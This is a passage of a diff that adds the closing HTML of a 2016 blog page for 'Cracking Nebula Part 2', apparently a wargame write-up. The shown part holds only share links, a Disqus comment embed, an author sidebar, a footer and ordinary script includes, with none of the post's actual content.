+        <a class="icon-gplus" href="https://plus.google.com/share?url=http%3a%2f%2funlogic.co.uk%2f2014%2f07%2f02%2fcracking-nebula-part2%2f" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title=""></a>
+    </li>
+    <li>
+        <a class="icon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2funlogic.co.uk%2f2014%2f07%2f02%2fcracking-nebula-part2%2f&title=Cracking%20Nebula%20Part%202" onclick="window.open(this.href, 'linkedin-share', 'width=600,height=494');return false;" title=""></a>
+    </li>
+</ul>
+
+        </article>
+        <div class="comments">
+            <h3></h3>
+            <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'unlogic';
+    var disqus_identifier = 'http:\/\/unlogic.co.uk\/2014\/07\/02\/cracking-nebula-part2\/';
+    var disqus_title = 'Cracking Nebula Part 2';
+    var disqus_url = 'http:\/\/unlogic.co.uk\/2014\/07\/02\/cracking-nebula-part2\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </main>
+    <aside class="author">
+  <img class="profile-image" src="http://unlogic.co.ukimages/avatar.jpg" alt="Sven Steinbauer" />
+  <p class="name"> 
+  <strong>Sven Steinbauer</strong></p>
+  <p class="address"></p>
+  <p class="link"></p>
+  <ul class="social">
+    
+<li><a href="//twitter.com/binaryheadache" class="icon-twitter" target="_blank" title="Twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//github.com/svenito" class="icon-github" target="_blank" title="Github"></a></li>
+
+
+
+
+<li><a href="http://unlogic.co.ukpost/index.xml" class="icon-rss" target="_blank" title="RSS"></a></li>
+
+  </ul>
+  <br><br>
+</aside>
+
+</div>
+
+<footer class="main-footer">
+  <div class="container clearfix">
+        <a class="icon-rss" href="http://unlogic.co.ukpost/index.xml" title="RSS"></a>
+        <p>&copy; 2016 &middot; Sven Steinbauer</p>
+  </div>
+</footer>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.8.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script>window.jQuery || document.write('<script src="http:\/\/unlogic.co.ukjs/vendor/jquery-1.11.0.min.js"><\/script>')</script>
+<script src="http://unlogic.co.ukjs/plugins.js"></script>
+
+</body>
+</html>
+
